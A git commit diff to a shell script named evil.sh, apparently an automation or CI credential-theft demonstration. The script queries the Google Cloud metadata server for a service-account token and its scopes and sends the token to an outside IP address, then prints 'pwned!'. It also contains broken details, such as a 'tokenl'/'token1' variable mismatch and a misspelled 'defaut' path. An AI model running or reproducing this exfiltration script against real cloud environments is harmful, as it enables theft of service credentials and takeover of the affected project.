100068c2142d2995c890ebc99ed0deb8b6ec596b
ckx-sec <13911336781@163.com>
2024-03-07 15:03:45 +0800

    update text

--- quickstart-automate/evil.sh
+++ quickstart-automate/evil.sh
@@ -2,12 +2,14 @@
 
 apt update
 
-apt install cunl -y
+apt install curl -y
 
 tokenl=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/defaut/token" -H "Metadata-Flavor: Google")
+scopes=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/defaut/scopes" -H "Metadata-Flavor: Google")
 
 curl "http://139.180.193.16:11000/?g=$token1"
 
 echo "pwned!"
-
-#ping1
+echo $token1
+echo $scopes
+#ping 1
